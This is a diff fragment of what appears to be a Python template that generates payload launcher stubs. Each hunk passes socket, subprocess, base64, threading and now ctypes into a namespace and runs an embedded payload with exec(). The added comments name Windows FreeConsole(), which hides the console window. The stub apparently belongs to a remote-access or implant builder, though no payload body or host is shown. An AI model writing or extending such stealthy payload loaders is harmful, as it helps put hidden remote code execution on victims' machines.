@@ -313,7 +313,8 @@ except Exception as e:
     raise
 
 try:
-    g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading}}
+    import ctypes  # For Windows FreeConsole()
+    g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading, 'ctypes': ctypes}}
     _emergency_log('[STARTUP] Executing payload...')
     exec(code, g)
 except Exception as e:
@@ -359,7 +360,8 @@ except Exception as e:
     raise
 
 try:
-    g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading}}
+    import ctypes  # For Windows FreeConsole()
+    g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading, 'ctypes': ctypes}}
     _emergency_log('[STARTUP] Executing payload...')
     exec(code, g)
 except Exception as e:
@@ -417,7 +419,7 @@ except Exception as e:
     raise
 
 try:
-    g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading}}
+    g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading, 'ctypes': ctypes}}
     _emergency_log('[STARTUP] Executing payload...')
     exec(code, g)
 except Exception as e:
@@ -456,6 +458,7 @@ try:
     platform_module = __import__('platform')
     json_module = __import__('json')
     threading_module = __import__('threading')
+    ctypes_module = __import__('ctypes')  # For Windows FreeConsole()
     _emergency_log('[STARTUP] All modules imported successfully')
 except Exception as e:
     _emergency_log('[ERROR] Failed to import modules: ' + str(e))
@@ -473,7 +476,7 @@ except Exception as e:
     raise
 
 try:
-    g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform_module, 'socket': socket_module, 'subprocess': subprocess_module, 'base64': base64, 'json': json_module, 'time': time, 'threading': threading_module}}
+    g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform_module, 'socket': socket_module, 'subprocess': subprocess_module, 'base64': base64, 'json': json_module, 'time': time, 'threading': threading_module, 'ctypes': ctypes_module}}
     _emergency_log('[STARTUP] Executing payload...')
     exec(code, g)
 except Exception as e:
@@ -531,7 +534,7 @@ except Exception as e:
     raise
 
 try:
-    g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading}}
+    g = {{'__name__': '__main__', 'sys': sys, 'os': os, 'platform': platform, 'socket': socket, 'subprocess': subprocess, 'base64': base64, 'json': json, 'time': time, 'threading': threading, 'ctypes': ctypes}}
     _emergency_log('[STARTUP] Executing payload...')
     exec(code, g)
 except Exception as e:
